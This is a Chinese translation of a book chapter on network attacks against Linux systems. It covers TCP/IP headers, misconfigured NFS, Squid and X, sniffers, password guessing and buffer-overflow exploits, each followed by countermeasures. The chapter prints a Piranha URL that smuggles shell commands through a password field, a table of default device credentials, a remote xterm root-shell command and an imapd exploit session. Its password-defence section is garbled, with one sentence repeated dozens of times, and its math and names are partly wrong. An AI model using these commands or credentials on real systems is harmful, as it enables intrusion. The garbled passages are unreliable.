IP协议（Internet Protocol）最初由美国军方开发，旨在为其通信提供一种可生存的网络拓扑结构。IP 成了分层协议结构（也称为协议栈）的基础。每个协议层为其其上层提供特定的功能（见图 6-1）。在发送信息时，栈中的每个协议会将来自上一层协议的所有头部和数据视为数据，并用它自己的头部和控制信息进行封装（接收时情况亦之）。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_209_0.png)

图 6-1. 分层协议概念

# 第 6 章：通过网络攻击

该系统的原始概念为当今的互联网提供了坚实的基础。IP协议族包含四个主要组件。这些组件通常被称为 TCP/IP 协议族。

- IP
- 传输控制协议 (TCP)
- 用户数据报协议 (UDP)
- 互联网控制消息协议 (ICMP)

在 TCP/IP 协议族之上的是应用协议内部，例如简单邮件传输协议 (SMTP)、超文本传输协议 (HTTP) 和文件传输协议 (FTP)。这些协议中的每一个都依赖于底层协议的服务来提供可靠的数据传输。

# 互联网协议

IP协议定义在 RFC 791 中。它是一种无连接协议，这意味着每个数据包独立地放在网络上并路由到其目的地。无法保证数据包一定会到达目的地，或者即使到达也会按正确的顺序到达。

图 6-2 显示了 IP 数据包头的图。注意地址是 32 位的。当数据包发送时，协议并不验证源地址。因此，有人可能会操控地址字段并伪造地址为其他内容（关于这一点以及如何将其用于攻击的更多细节请参见第 7 章）。如果数据包到达系统或你正尝试识别 IP 流量的源，你应该记住这一事实。

生存时间（TTL）字段防止数据包进入永久的路由循环。每当数据包被网络设备（如路由器）处理时，数据包的 TTL 减 1。当 TTL 达到 0 时，数据包被丢弃，并向源地址发送“ICMP TTL 超时”消息（见本章稍后的表 6-2）。该字段用于路由追踪（traceroute）。traceroute 程序发送一个 TTL 为 1 的数据包。第一跳将用“ICMP TTL 超时”消息进行响应。程序随后发送一个 TTL 为 2 的消息，以此此类推，直到数据包到达目的地。

如果 IP 数据包跨越帧大小较小的网络，它们可能会被分片。这是确保网络运行的必要功能；然而，分片也可以用于攻击目的。MF 字段用于指示后续是否有分片。该字段中为 1 表示有后续分片，而 0 表示该数据包是最后一个分片。

180 黑客 Linux 揭秘：Linux 安全秘密与解决方案

| IP 版本 (4 位) | 头部长度 (4 位) | 服务类型 (8 位) | 总长度 (16 位) |
|---|---|---|---|
| 标识 (分片 ID (16 位)) | R D M F | 分片偏移 (13 位) | |
| 生存时间 (TTL) (8 位) | 协议 (8 位) | 头部校验和 (16 位) | |
| 源地址 (32 位) | | | |
| 目的地址 (32 位) | | | |
| 选项（可变长度，最大长度 40 字节） | | | |
| 数据 | | | |

图 6-2. IP 头部

分片偏移标识分片数据在原始数据包中的位置。分片可被用于绕过防火墙。

> 注意 现代网络通常不发生数据包分片，因此分片数据包的出现意味着系统问题或攻击。

IP 数据包的数据部分包含下一层协议（TCP、UDP 等）的头部以及数据包数据。

# 传输控制协议

图 6-3 显示了 TCP 头部，同样定义在 RFC 793 中。与 IP 不同，TCP 是一种面向连接的协议。这意味着 TCP 保证交付和数据包的顺序。这是通过使用序列号和确认号实现的。

| 源端口 (16 位) | 目的端口 (16 位) |
|---|---|
| 序列号 (32 位) | 确认号 (32 位) |
| 偏移 (4 位) | 预留 (6 位) | U | A | P | R | S | F | 窗口 (16 位) |
| 校验和 (16 位) | 紧急指针 (16 位) |
| 选项（可变长度并用 0 填充） | |
| 数据 | |

图 6-3. TCP 头部

IP 使用 IP 地址将数据包路由到正确的目的系统，而 TCP 使用端口号将数据包路由到目的系统的正确进程，并识别源系统上的发送进程。与 IP 地址一样，发送系统并不验证源端口，因此可能会被攻击者伪造。

TCP 头部提供了一种识别所发送的 TCP 数据包类型的机制。各种类型由标志位（紧急、确认、推送、重置、同步和结束）定义。紧急和推送标志在合法连接中很少使用。表 6-1 显示了标志的有效组合。其他标志组合可用于识别系统或进行操作系统指纹。

# 用户数据报协议

UDP 定义在 RFC 768 中，是 TCP 的无连接等效物。与 IP 一样，UDP 数据包发送到目的系统时不保证其一定到达或按顺序到达。图 6-4 显示了 UDP 头部。如图中所示，UDP 头部非常简单，不包含标志位或序列号。

## 破解 Linux 揭秘：Linux 安全秘密与解决方案

| 标志组合 | 含义 |
|---|---|
| SYN | 这是连接中的第一个数据包，表示系统希望与第二个系统建立连接。 |
| SYN|ACK | 第二个系统对 SYN 包做出响应，确认原始消息并发送其 SYN 信息。 |
| ACK | 在已建立的连接中，每个数据包都设置了 ACK 位，以确认之前收到的数据包。 |
| FIN | 当连接准备关闭时，一个系统会向另一个系统发送 FIN 包。 |
| FIN|ACK | 这种组合用于确认第一个 FIN 包并完成关闭序列。 |
| RST | 每当系统收到意外的包包时，就会发送一个重置包——例如，如果系统在没有发送 SYN 的情况下收到了 SYN|ACK 包。 |

**表 6-1.** 合法的 TCP 标志组合

与 TCP 类似，UDP 依赖于 IP 地址来将信息传递到正确的系统。UDP 使用端口号将数据传递到目标系统上的正确进程。由于发送系统不会检查 UDP 头部，因此源端口可以是入侵者希望的任何端口。由于 UDP 不需要建立连接，因此伪造源 IP 地址和源 UDP 端口要容易得多。

| 源端口号 (16 位) | 目的端口号 (16 位) |
|---|---|
| 长度 (16 位) | 校验和 (16 位) |
| 数据 | |

**图 6-4.** UDP 头部

## 第 6 章：网络攻击

RFC 792 定义了 ICMP，它用于协助解决其他协议遇到的问题。例如，ICMP 消息提供了网络不可达或目标系统上的端口未监听的指示。ICMP 也可以用于确定系统是否在线（ping）。表 6-2 显示了可以在网络上使用的 ICMP 类型代码。

许多网站在防火墙或边界路由器上拦截了 ICMP。这通常是为了防止外部人员获取有关该网站的信息。然而，限制 ICMP 会影响网络性能。例如，如果你阻止了类型 3（目标不可达），网页浏览器将超时而不是检测到目标不可达。必须权衡性能问题与信息风险。例如，至少有两个程序允许交互式会话接管 ping 包。

## 应用层协议

应用层协议如简单邮件传输协议 (SMTP)、邮局协议 (POP) 或超文本传输协议 (HTTP) 运行在 IP 及其 TCP 或 UDP 之上。这些协议使用下层协议的功能将数据包从源系统移动到目标系统。

| 类型代码 | ICMP 消息 |
|---|--- |
| 0 | 回显应 (ping 响应) |
| 3 | 目标不可达 |
| 4 | 源洪弃 (Source Quench) |
| 5 | 重定向 (Redirect) |
| 8 | 回显 (ping 请求) |
| 11 | TTL 超时 |
| 12 | 参数问题 |
| 13 | 时间戳请求 |
| 14 | 时间戳回复 |
| 17 | 地址掩码请求 |
| 18 | 地址掩码回复 |

表 6-2. ICMP 类型代码含义

## 破解 揭秘：Linux 安全秘密与解决方案

应用层协议中的几种是基于文本的，因此与这些协议交互以调试网络或检查连接性变得相对容易。例如，以下会话通过直接与邮件系统交互创建邮件消息：



`machine$ telnet my_mail_server.com 225`

```
220 my_mail_server.com SMTP RS ver 1.0.57s

helo my_test_server.com

250 my_mail_server.com Hello my_test_server.com [192.168.98.91], I'm listening

mail from: <test@my_test_server.com>

250 test@my_test_server.com... Sender ok

rcpt to: <tester@my_mail_server.com>

250 tester@my_mail_server.com... Recipient ok

data

354 enter mail, end with '.' on a line by itself

TO: tester@my_mail_server.com

FROM: test@my_test_server.com

Subject: This is a test
```

这是一个对消息系统的测试

```
250 011264701 Message accepted for delivery
quit
221 my_mail_server.com closing connection
```

通过使用 `telnet` 客户端并使用命令 `telnet <host> <port number>`，可以使用 `telnet` 创建到系统上任何活动服务的连接。

确保你 `telnet` 到一个使用文本协议的服务。你可以 `telnet` 到一个使用二进制协议的服务，但除了建立连接外，你将无法获得良好的结果。

可以通过使用 `telnet` 并进入端口 `110` 来在 `POP` 服务器上执行相同类型的操作，如下所示：

```
machine$ telnet my_pop_server.com 110
+OK QPOP (version 2.53) at my_pop_server.com starting.
user tester
+OK Password required for tester.
pass test
+OK tester has 0 messages (0 octets).
quit
+OK Pop server at my_pop_server.com signing out.
```

## 公共电话网络

除了连接到 `TCP/IP`，许多系统还连接到电话网络。

# 第 8 章：攻击网络

| | |
|---|---|
| 流行性 | 8 |
| 简单性 | 10 |
| 影响 | 5 |
| 风险等级 | 7 |

破解程序识别哪些端口是开放的。最流行的方法之一是使用名为破解的程序。一旦黑客识别了端口，他将对密码进行暴力破解。这种攻击类型很常见且会导致暴露。例如，密码可能会被写下来并盗取。

## 破解措施

如果你必须允许访问，保护数字的第一步是使用双因子身份验证。与其只使用密码，不如要求以下内容的组合：

- 你知道的（如密码）

- 你拥有的（如令牌）

- 你具备的（如指纹）

每种方法本身都有问题。通过结合因素（例如密码和令牌），可以克服单一方法的漏洞。生物识别信息可能被盗取或泄露。

## 破解：Linux 安全秘密与解决方案

有关密码安全的更多信息，请参阅第 9 章。

## 默认或错误配置

获取访问的最简单方法可能是允许以默认配置安装操作系统。某些操作系统带有非常糟糕的默认配置，允许对系统的访问。某些流行的软件也是如此。

## NFS 挂载

`NFS` 用于将远程文件系统挂载到本地目录。如果系统配置恰当，导出将受到严格控制，因此暴露性最小。然而，如果配置不当，系统将面临来自任何外部的攻击。

![](img/3329ffb1435b4baef56fcd2c28ec6cd_217_0.png)

> 注意：允许组织外部导出文件系统通常是不智的。在配置正确的情况下，`NFS` 可以严格控制本地网络内的导出；但是应该在防火墙上阻止 `NFS` 以及所有的 `RPC` 服务。

### 攻击配置不当的 NFS 导出

| | |
|---|---|
| 流行性 | 8 |
| 简单性 | 10 |
| 影响 | 10 |
| 风险等级 | 10 |

最初，`/etc/exports` 用于配置远程系统可以挂载哪些文件系统。文件格式如下：

```
directory -options [, more options necessary]
```

一个配置糟糕的 `/etc/exports` 文件可能如下：

```
/ rw
```

这意味着根文件系统以读写权限导出给任何网络。通过从远程系统发布挂载命令，任何用户都可以挂载根文件系统，从而查看或修改本地系统上的文件。挂载命令如下：

```
# 第 8 章：跨网络攻击

mysystem mount <host>:<filesystem> <local directory>
```

在最近的系统中，文件共享是通过 `/etc/dfs/dfstab` 文件进行配置的。该文件的语法与 `/etc/exports` 文件不同，格式如下：

```
share -F <fsype> -o <options> -d <导出系统的文本名称> <pathname>
```

上述示例等效的 `/etc/exports` 文件为：

```
share -F nfs -o rw /
```

### NFS 导出的防御措施

为了保护文件系统免受未经授权的访问，应该在防火墙上拦截 `NFS`。这可以通过阻止入站 `NFS`（端口 `2049`）来实现。如果不需要 `NFS`，请将其完全关闭（这是一个更好的解决方案）。这必须在启动时的 `RC` 文件中完成（有关如何操作的详情请参附录 B）。

如果内部需要 `NFS`，请确保只导出必要的文件系统。例如，如果你允许远程挂载主目录，请仅导出 `/home` 而不是 `/`。请验证你已正确配置了 `NFS`，检查 `/etc/exports` 和 `/etc/dfs/dfstab`，以确保没有内容被以读写权限共享给所有人。

## Netscape 默认配置

`Netscape` 附带了一个名为 `SuiteSpot` 的程序，包含其企业 `Web` 服务器 `Fasttrack`、消息服务器和 `Colbarra` 服务器。该工具用于管理 `Web` 服务器，并包含 `Java` 和 `JavaScript` 表单来协助此功能。

### 攻击 Netscape 默认配置

| 流行度: | 3 |
| 简单性: | 3 |
| 影响: | 7 |
| 风险值: | 4 |

`Suite` 服务器将配置 `Netscape` 服务器的用户名和密码存在服务器根目录下的文件中，该文件默认情况下对所有人可读。密码文件位于 `/web_server_root/admin-serv/config/admpw`。可以使用网络浏览器指向该文件来从网络访问它。格式为 `user:password`。虽然文件经过了加密，但可以通过暴力破解破解密码。如果暴力破解成功，入侵者将获得服务器的完全访问权限。

暴力破解密码攻击简单地尝试每一个可能的密码以查看是否有效。显然，密码越长，暴力破解所需的时间越长。然而，单凭长度无法防止暴力破解成功。如果攻击者拥有足够的时间和计算机资源，攻击最终会成功。

### Netscape 默认配置的防御措施

`admpw` 文件应受到保护防止未经访问。一旦正确设置权限，通过执行 `stop-admin` 和 `start-admin` 命令停止并重启服务器。

## Squid

`Squid` 是一种常用在 `Linux` 系统上的 `FTP` 和 `HTTP` 代理。像 `Squid` 这样的代理用于加速内部用户访问 `Web` 的速度，并记录内部用户访问的站点。如果配置得当，`Squid` 能够很好地执行这些功能。如果配置不当，`Squid` 可能允许攻击者访问你的内部网络。

### 攻击配置不当的 Squid 服务器

| 流行度 | 9 |
| 简单性 | 8 |
| 影响 | 6 |
| 风险评分 | 7 |

`Squid` 可能会被错误配置，允许外部地址将该系统作为访问内部系统的代理。这将允许攻击者使用你的 `Squid` 服务器作为代理，即使他使用的是非可路由地址，也能看到或访问内部系统。配置错误的一个示例是 `squid.conf` 文件中的以下内容：

```
tcp_incoming_address <squid system external address>
tcp_outgoing_address <squid system internal address>
udp_incoming_address <squid system external address>
udp_outgoing_address <squid system internal address>
```

### 配置不当的 Squid 服务器的防御措施

首先，设置适当的防火墙规则阻止外部地址访问端口 `3128`（`Squid` 代理端口）。然后编辑 `squid.conf` 文件并确保以下行正确的：



```
tcp_incoming_address <squid system internal address>
tcp_outgoing_address <squid system external address>
udp_incoming_address <squid system internal address>
udp_outgoing_address <squid system external address>
```

# 第 6 章：跨网络攻击

## Windows 系统

X Windows 系统用于在 UNIX 系统上创建图形窗口环境。X 系统使用端口 6000 到 6063 (TCP)，并能够向远程终端显示信息。遗憾的是，有许多配置 X 的方法可以让入侵者获得屏幕上信息的权限。

### 攻击糟糕的 X 配置

| 流行度: | 5 |
| 简单性: | 8 |
| 影响: | 7 |
| 风险评分: | 7 |

基础 X 安全使用 `xhost` 机制。该程序允许你指定允许连接到本地 X 服务器的系统。如果单独执行命令，你将获得允许连接的系统列表。你可以通过执行以下命令添加列表：

```
machine$ xhost +<system name>
```

如果你省略了系统名称，任何系统都将允许连接。这允许入侵者做很多事情。例如，他可能可以使用一个名为 Xkey 的程序记录你在 Windows 显示器上输入的任何按键。另一个程序名为 Xscan，它会扫描网络以寻找漏洞的 X 系统。这两个程序都可以在 http://packetstorm.security 找到。

如果日志记录不是你需要的，可以采取额外的防御措施。有一些简单的脚本允许入侵者获取屏幕快照。要实现这一点，你还需要确保系统中存在 `/usr/X11/bin/auth`。

### 糟糕 X 配置的防御措施

防止远程入侵者尝试访问 X 的主要防御措施是在防火墙上拦截端口 6000 到 6063。可以使用 `ipchains` 配置阻止此类访问：

```
machine# ipchains -p tcp -j DENY -d 0.0.0.0 6000:6063
```

## 暴露的 Linux：Linux 安全秘密与解决方案

X 会话也可以通过安全 Shell (`ssh`) 进行转发。这样做，整个会话将被加密，消除了窃听威胁。

注意：通过 X11 转发的机器上的 root 用户将拥有完全权限，因为使用了该用户。因此，仅在信任两个端的情况下使用 X11 转发。

### 默认密码

默认密码是很讨厌的东西。似乎除了访问系统或网络设备的管理员外，所有人都知道它们。Linux 系统在构建时通常要求输入密码。这将是 root 账户的密码，从而避免了默认密码问题。然而，并非所有应用程序都如此。

| 流行度 | 3 |
| 简单性 | 8 |
| 影响 | 8 |
| 风险评分 | 6 |

### Piranha 默认密码

Red Hat 为 Linux 服务器提供了 Piranha 虚拟机和负载均衡包。在 Piranha-gui 程序的 0.4.12 版本中，有一个名为 `piranha` 的默认账户，默认密码为 `q`。使用此用户-密码组合将允许攻击者在机器上执行任意命令。

备注：此攻击与软件自带的 `passwd.php3` 脚本配合使用。

要访问系统，将浏览器指向以下 URL：

http://example_web_server.com/piranha/secure/passwd.php3

使用上述用户组合，然后执行以下 URL：

http://example_web_server.com/piranha/secure/passwd.php3?try1=g23%3Btouch+%2Ftmp%2FTESTED%3B&try2=g23%3Btouch+%2Ftmp%2FTTESTED%3B&passwd=ACCEPT

这将在 `/tmp` 目录创建一个名为 `TESTED` 的文件。修改此 URL 可能会导致其他类型的操作发生。

### Piranha 默认密码的应对措施

Red Hat 提供了针对此特定漏洞的补丁。对于你安装在系统上的任何操作系统或应用程序，请确保你已获取了来自厂商的最新补丁。

### 网络设备默认密码

| 指标 | 数值 |
| :--- | :--- |
| 流行度 | 8 |
| 简单性 | 9 |
| 影响程度 | 9 |
| 风险等级 | 9 |

许多网络设备带有默认密码或账户。虽然这些访问并非针对 Linux 系统，但网络设备可能允许攻击者访问网络段，并通常会破坏所连系统的安全性。表 6-3 显示了一些网络设备及其默认账户和密码的列表。该列表是 http://packetstorm.security.com/ 上更大列表的一部分。搜索 `defaultpassword.txt` 即可。

| 网络设备 | 用户名 | 密码 |
| :--- | :--- | :--- |
| 3Com | Admin | synnet |
| 3Com | Read | synnet |
| 3Com | Write | synnet |
| 3Com | Monitor | monitor |
| 3Com | Manager | manager |
| 3Com | Security | security |
| 3comCoreBuilder7000/6000/3500/2500 | Debug | synnet |
| 3comCoreBuilder7000/6000/3500/2500 | Tech | tech |
| Alteon ACEswitch180e (web) | Admin | admin |
| Alteon ACEswitch180e (telnet) | Admin | <blank> |

**表 6-3.** 部分网络设备的默认用户名和密码

| 网络设备 | 用户名 | 密码 |
| :--- | :--- | :--- |
| Bay_routers | Manager | <blank> |
| Bay_routers | User | <blank> |
| Cabletron (路由器和交换机) | <blank> | <blank> |
| Linksys_DSL | n/a | admin |
| Livingston_IRX_router | !root | <blank> |
| Livingston_officerrouter | !root | <blank> |
| Livingston_postmaster2/3 | !root | <blank> |
| Netopia_7100 | <blank> | <blank> |
| Netopia_9500 | Netopia | netopia |
| Shiva | Root | <blank> |
| Shiva | Guest | <blank> |

**表 6-3.** 部分网络设备的默认用户名和密码（续）

### 网络设备默认密码的应对措施

在设备进入生产网络之前，应更改所有默认密码。请阅读制造商的说明以进行此操作。

## 流量嗅探

你经常会听说某系统被黑客入侵，黑客在系统上安装了*嗅探器*（sniffer）。嗅探器是黑客用来访问系统的常用工具，一旦进入系统，就可以通过捕获其他系统的用户名和密码来增强其访问权限。嗅探器用于破解系统的数量可能多于任何其他黑客工具。

### 嗅探器的工作原理

嗅探器通过捕获流经网络的数据来工作。在正常网络条件下，数据被封装在帧中，以便在局域网（LAN）的系统之间传输。每个帧都指向一个特定的 MAC 地址。每个网卡（NIC）和网络设备都有一个由制造商指定的唯一 MAC 地址。大多数网卡都不允许更改 MAC 地址。

### 通过网络攻击

当每个帧被放在局域网上时，局域网系统中的网卡会检查帧中的 MAC 地址。如果 MAC 地址属于特定的网卡（表示该帧指向该系统），嗅探器将读取整个帧，对其进行处理，并将帧的数据部分（很可能是 IP 包）传递给协议栈进行处理。如果帧中的 MAC 地址是广播地址，局域网上的每个系统都会读取帧并处理数据。否则，系统将读取地址并忽略帧的数据部分。

嗅探器通过将网卡置于所谓的“混杂模式”（promiscuous mode）来工作。当网卡处于混杂模式时，无论 MAC 地址为何，它会将每个帧的数据传递给协议栈。因此，系统上的嗅探器就可以检查帧的数据部分并提取感兴趣的信息。这可能包括头部信息或用户名、密码等信息。

黑客可以使用嗅探器来访问系统，因为许多协议以明文发送敏感信息。例如，`telnet`、`FTP` 和 `HTTP` 都会在线路上明文传输用户名和密码。一些支持 Web 的管理工具也使用 HTTP 发送用户名和密码。例如，`webmin` 就是这样做的。它是一个非常有用且流行的 Linux 管理工具，但不是在不安全网络上的良好选择。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_224_0.png)

### 嗅探器可以捕获用户名和密码

| 指标 | 数值 |
| :--- | :--- |
| 流行度 | 10 |
| 简单性 | 7 |
| 影响程度 | 10 |



| 风险等级 | 9 |

如前所述，大多数黑客在获得系统的 `root` 权限后会在系统上安装嗅探器。嗅探器可能会伪装成看似无害的程序，并将任何用户名和密码捕到文件中。还有自动化脚本用于连接被黑的系统并远程检索嗅探器文件。

# 嗅探应对措施

最好的应对措施是使用加密。不要使用 `telnet`，使用 `SSH`；不要使用 `FTP`，使用 `SFTP`；不要使用 `HTTP`，使用 `HTTPS`。

## 第 6 章：跨网络攻击

从这段日志中，你可以看到在 `10.0.0.101` 和 `testbox.example_web.net` 之间正在建立 `telnet` 会话。可以从 `http://www.tcpdump.org` 下载 `Tcpdump`。

## Hunt

`Hunt` 由 Hunt Project（`http://www.cri.cz/kra/index.html`）开发。该工具可以作为嗅探器使用，也可以用于窃取连接并在网络上造成普遍的混乱。从下面的输出可以看出，`Hunt` 是一个比 `tcpdump` 更先进的黑客工具：

```
192.168.0.103 [1069] 172.23.98.91 [110]
+OK QPOP (version 2.53) at testbox.example_web.net starting.

192.168.0.103 [1069] --> 172.23.98.91 [110]
USER testester

192.168.0.103 [1069] --> 172.23.98.91 [110]
PASS test1
```

这是 `Hunt` 日志的一小部分，展示了如何使用 `Hunt` 捕捉用户名和密码。在这种情况下，用户 (`testester`) 正在通过 `POP` 服务器访问邮件。所使用的密码是 `test1`。

## Linux-Sniff

并不是所有的嗅探器都像 `Hunt` 那样复杂。有些非常朴素且普通。例如，`Linux-sniff`（可在 `http://packetstorm.securify.com` 获得）是一个非常简单的嗅探器。以下是 `Linux-sniff` 的部分输出：

```
[ Linux-sniff by: Xphere -- phreak.nl ]
------< HOST: 192.168.0.107 PORT: 1408 --> HOST: example_web.com PORT: 110 >
USER testester
PASS test1
STAT
QUIT
------< Received FIN/RST. >
------< HOST: example_web.com PORT: 110 --> HOST: 192.168.0.107 PORT: 1408 >
+OK QPOP (version 2.53) at example_web.com starting.
+OK Password required for testester.
+OK testester has 0 messages (0 octets).
+OK 0 0
+OK Pop server at example_web.com signing off.
------< Received FIN/RST. >
```

这同样是在捕捉 `POP` 用户名和密码。`Linux-sniff` 对信息进行了良好的格式化，非常易读。该嗅探器为 `HTTP` 基础认证、`telnet` 和 `FTP` 会话提供同样丰富的信息。

## 其他嗅探器

互联网上有许多嗅探器可用。有些是原始嗅探器的复制或增强版。以下是可用工具的精选：

- `Sniffit` `http://rpmfind.net/linux/RPM/freshmeat/sniffit/index.html`

- `Ethereal` `http://ethereal.zing.org`

- `Snort` `http://www.snort.org`

- `Kararski` `http://www.mojo.calyx.net/~btx/karpski.html`

- `Gnusniff` `http://www.ozemail.com.au/~peterhawkins/gnusniff.html`

- `Dsniff` `http://www.monkey.org/~dugsong/` （关于 `dsniff` 能力更多请参见第 7 章）

## 猜测密码

密码是计算机系统常用的身份验证形式。即使更改了密码，它们仍可能是黑客的易受攻击点。密码被用于认证 `telnet` 或 `Ssh` 等交互式会话、`FTP` 等文件传输，以及通过 `POP` 或 `IMAP` 进行的文件检索。如果在系统上发现这些服务，它们将为黑客提供一个可以利用的潜在漏洞。

## 通过猜测密码获取访问

| 指标 | 数值 |

| :--- | :--- |

| 流行度 | 8 |

| 简单性 | 10 |

| 影响 | 10 |

| 风险等级 | 10 |

在 Linux 系统上，密码长度限制为八字符。如果只使用小写字母，将提供 `$2^{26}$` 种总组合（约 2090 亿）。如果使用大写字母和数字，我们可以得到 `$2^{62}$` 种可能的组合（约 218 万亿）。

遗憾的是，大多数计算机用户和管理员使用常用单词或与自己某种相关的单词。其他流行密码还包括“星际迷航”角色以及 J.R.R. 托尔金的《指环王》中的名字。他人可以通过猜测这些密码来进入系统。新的暴力破解工具也让攻击者尝试大量密码变得非常容易。图 6-5 显示了一个在 Windows 下运行的工具，但它可以针对任何运行 `telnet`、`HTTP`、`POP`、`IMAP` 或 `FTP` 等服务的类型的系统（包括 Linux），并且还可以尝试登录 `root` 或用户提供的帐户列表。

## 密码猜测的防御措施

防止密码猜测的第一种防御措施是防止黑客获取系统上的用户账户列表。要做到这一点，请关闭

![](img/33829ffb1435b4baef56fcd2c28)

（图 6-5：暴力破解工具）

## 暴露的 Linux：秘密与解决方案

关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的

```
| MAX_DAYS 9000 |
| MIN_DAYS 30 |
| LEN 8 |
```

限制可以登录的帐户也是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务是减少攻击面的简单方法。关闭不需要的服务的

```
| CREATE_HOME yes
```

`PASS_MIN_LEN` 定义了密码最小长度。`PAM` 或密码替换也可以用于增加密码攻击的难度（详情请参见第 9 章）。

用户教育也可以帮助降低密码攻击的风险。为每个用户提供系统使用方法以及关于强密码的指南。



当然，消除此漏洞的最佳方法是不使用像 SecureID、Key 或某些生物识别之类的密码，如果是的话……

## 漏洞

漏洞是操作系统、应用程序或脚本中的问题，允许黑客执行其不应执行的操作并通常可以获得。每天都会发现新的漏洞，其中许多是允许 root 权限的缓冲区溢出。这些渗透对系统是毁灭性的，因为黑客对系统拥有完全控制权。利用漏洞通常是控制系统并加载其他软件（如后门和嗅探器）的第一步。

## 缓冲区溢出

缓冲区溢出漏洞是开发者在执行某些操作时使用不当编码技术时产生的。导致缓冲区溢出的罪魁祸首可能是 C 字符串函数，如 `strcpy()`, `sprintf()`, `scanf()` 和 `gets()`。

# Linux 破解揭秘：Linux 安全秘密与解决方案

栈将决定缓冲区溢出在系统上的行为。你可能会导致一个 shell 程序运行，从而提供对系统的交互式访问，也可能导致另一个应用程序启动。你甚至可以修改 `inetd.conf` 等配置文件，并误导新服务的启动。

## 漏洞服务

服务最容易受到远程利用的影响，因为它们的设计初衷是为了与目标系统进行某种类型的远程通信。许多应用程序和操作系统已成为缓冲区溢出或其他漏洞的受害者。

## 服务中的缓冲区溢出

| 流行度: | 10 |

| --- | --- |

| 简单性: | 10 |

| 影响: | 10 |

| 风险评分: | 10 |

Linux 系统或应用程序中存在许多缓冲区溢出漏洞，并且有许多利用脚本让任何拥有网络浏览器和 Linux 系统的人都能攻击任何漏洞（访问 `http://www.rootshell.com` 获取这些利用脚本）。针对 Linux 系统的常见攻击包括针对以下内容的：

- `rpc.mountd` (NFS 服务的一部分）

- `rpc.statd` (NFS 服务的一部分)

- `imapd/popd`

- `wu-ftpd`

当利用程序运行时，攻击者将让攻击执行一个有用的操作。常见操作包括为系统添加后门（例如一个没有密码的账户或特定端口的监听器），或者启动 shell 以便攻击者可以直接访问系统。

以下是针对漏洞版本 `imapd` 的攻击会话示例：

```
hacker_machine# imapd-exploit my_mail_server.com
IMAP Exploit for Linux.
Author: Akylonius (aky@galeb.etf.bg.ac.yu)
Modifications: pl (pl1.org)
Completed successfully.
```

```
hacker_machine# telnet my_mail_server.com
Trying 192.168.0.15...
Connected to my_mail_server.com
```

![](img/33829ffb1435b4baef56fcd2c28ec6cd_231_0.png)

# 第 6 章：跨网络攻击

Red Hat Linux 发布 5.0

i686 上的内核 2.0.35

```
login: root
my_mail_server#
```

此示例对 `/etc/passwd` 文件进行了修改，并为 root 账户插入了一个没有密码的新条目。针对 mount 服务的常见攻击脚本为黑客提供了 root shell。WU-FTP 的利用程序允许攻击者执行命令。诸如 `/usr/X11R6/bin/xterm -display <hostname>:0` 的命令将为攻击者在系统上提供一个 xterm 和 root shell。

## 缓冲区溢出的防御措施

如果尝试对你的系统进行溢出，你可能会看到日志消息识别出这些尝试。日志消息将识别服务（如 IMAPD 或 RPC.STAT）并显示某些关于未识别命令的信息。这些将是失败的缓冲区溢出尝试，可能表明你的系统正在被探测和遭受攻击尝试。

如果服务不是必要的，要么从系统中移除这些漏洞，要么在防火墙上阻止对它们的访问。目前只有一种措施：保持系统和应用程序补丁的更新。

一个非常有前景的未来选项是一个名为 Immunix 项目 (`http://www.immunix.com`)。Immunix 是一系列工具，旨在通过加强系统组件和平台对安全攻击的防御能力来增强安全性。该系统的构建方式使得漏洞的利用会导致进程或服务停止，而不是赋予黑客 root 权限。

### 漏洞脚本

服务和操作系统组件并不是计算机系统中唯一容易受到利用攻击的各个。网站上使用的脚本也可能存在漏洞（有关网站的更多信息请参见第 12 章）。

### 脚本漏洞

| 流行度: | 10 |

| --- | --- |

| 简单性: | 10 |

| 影响: | 10 |

| 风险评分: | 10 |

漏洞脚本是那些由相对常见的脚本安装的脚本。这些脚本可能受到缓冲区溢出或其他内部漏洞的影响。漏洞脚本包括 `count.cgi`、`php.cgi`、`nph.cgi` 和 `nph-test.cgi`。

